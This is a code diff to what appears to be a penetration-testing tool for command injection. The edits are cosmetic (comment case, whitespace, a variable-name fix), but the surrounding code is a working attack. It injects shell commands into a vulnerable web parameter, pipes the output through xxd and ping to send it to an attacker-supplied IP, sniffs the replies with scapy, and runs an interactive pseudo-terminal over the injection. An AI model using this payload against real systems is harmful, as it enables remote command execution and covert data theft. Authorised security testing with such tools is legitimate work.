@@ -36,8 +36,8 @@ logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 
 """
-  The ICMP Exfiltration technique: 
-  Exfiltrate data using the ping utility.
+  The icmp exfiltration technique: 
+  exfiltrate data using the ping utility.
   
   [1] http://blog.ring-zer0.com/2014/02/data-exfiltration-on-linux.html
   [2] http://blog.curesec.com/article/blog/23.html
@@ -60,7 +60,7 @@ def snif(ip_dst,ip_src):
     sniff(filter = "icmp and src " + ip_dst, prn=packet_handler, timeout=settings.DELAY)
     
 def cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src):
-  # ICMP Exfiltration payload.
+  # icmp exfiltration payload.
   payload = ('; ' + cmd + ' | xxd -p -c8 | while read line; do ping -p $line -c 1 -s16 -q ' + ip_src + '; done')
   if http_request_method == "GET":
     url = url.replace(settings.INJECT_TAG,"")
@@ -75,7 +75,7 @@ def cmd_exec(http_request_method,cmd,url,vuln_parameter,ip_src):
   response = urllib2.urlopen(req)
   time.sleep(2)
   sys.stdout.write("\n" + Style.RESET_ALL)
-  
+
 def input_cmd(http_request_method,url,vuln_parameter,ip_src):
   print "\nPseudo-Terminal (type 'q' or use <Ctrl-C> to quit)"
   while True:
@@ -96,13 +96,15 @@ def exploitation(ip_dst,ip_src,url,http_request_method,vuln_parameter):
   signal.signal(signal.SIGINT, signal_handler)
   sniffer_thread = threading.Thread(target=snif, args=(ip_dst,ip_src,)).start()
   time.sleep(2)
+
   input_cmd(http_request_method,url,vuln_parameter,ip_src)
-  SnifferThread.join()
+  sniffer_thread.join()
 
 def icmp_exfiltration_handler(url,http_request_method):
+
   # You need to have root privileges to run this script
   if os.geteuid() != 0:
-    print Back.RED + "\n(x) Error:  You need to have root privileges to run this option.\n" + Style.RESET_ALL
+    print "\n" + Back.RED + "(x) Error:  You need to have root privileges to run this option." + Style.RESET_ALL
     sys.exit(0)
 
   if http_request_method == "GET":
@@ -138,7 +140,7 @@ def icmp_exfiltration_handler(url,http_request_method):
 
   ip_data = menu.options.ip_icmp_data
       
-  technique = "ICMP exfiltration technique"
+  technique = "icmp exfiltration technique"
   sys.stdout.write("(*) Testing the "+ technique + "... \n")
   sys.stdout.flush()
   
